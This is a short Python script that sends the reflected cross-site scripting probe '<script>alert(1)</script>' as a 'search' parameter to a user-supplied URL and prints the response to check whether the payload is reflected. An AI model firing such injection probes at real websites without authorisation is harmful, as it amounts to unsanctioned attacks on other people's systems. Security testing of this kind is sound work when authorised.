import requests
# dont forget to change the url
url = input("url : ")
r  = requests.get(url, params={'search':'<script>alert(1)</script>'})

print(r.text)

